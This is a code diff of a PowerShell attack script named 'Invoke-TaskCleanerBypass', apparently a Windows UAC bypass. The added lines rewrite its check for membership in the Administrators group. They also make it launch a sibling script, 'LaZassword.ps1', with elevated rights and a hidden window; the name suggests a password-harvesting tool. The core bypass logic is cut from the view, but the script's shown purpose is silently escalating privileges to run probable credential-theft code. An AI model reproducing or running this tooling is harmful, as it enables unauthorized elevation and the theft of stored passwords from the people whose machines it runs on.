@@ -1,3 +1,10 @@
+#######################################################
+#		NO CONFIGURATION NEEDED		      #
+#######################################################
+
+
+# Create function "Invoke-TaskCleanerBypass"
+  
 function Invoke-TaskCleanerBypass {
     [CmdletBinding()]
     Param(
@@ -34,12 +41,15 @@ function Invoke-TaskCleanerBypass {
         $paramDictionary.Add($paramname, $MethodParam)
         return $paramDictionary
     }
-
     
 
     Process {
         #If not in the Administrators group, do not run.
-        if(!(gwmi -class win32_groupuser | Where {$_.GroupComponent -match "Administrators" -and $_.PartComponent -match $env:username})) {
+	$userToFind = $args[0] 
+	$administratorsAccount = Get-WmiObject Win32_Group -filter "LocalAccount=True AND SID='S-1-5-32-544'"
+	$administratorQuery = "GroupComponent = `"Win32_Group.Domain='" + $administratorsAccount.Domain + "',NAME='" + $administratorsAccount.Name + "'`""
+	$adminusers = Get-WmiObject Win32_GroupUser -filter $administratorQuery | select PartComponent |where {$_ -match $userToFind}
+        if(!($adminusers -match $env:username)) {
             Return
         }
         #If not Windows 8.1 or higher then exit.
@@ -92,5 +102,9 @@ function Invoke-TaskCleanerBypass {
         }
     }
 }
+
+# Define variable for the current directory
 $currentdir = [System.IO.Path]::GetDirectoryName($myInvocation.MyCommand.Definition)
-Invoke-TaskCleanerBypass -Method File -Filename $currentdir\lazassword.ps1 -hide
+
+# Execute LaZassword.ps1 as admin
+Invoke-TaskCleanerBypass -Method File -Filename $currentdir\LaZassword.ps1 -hide
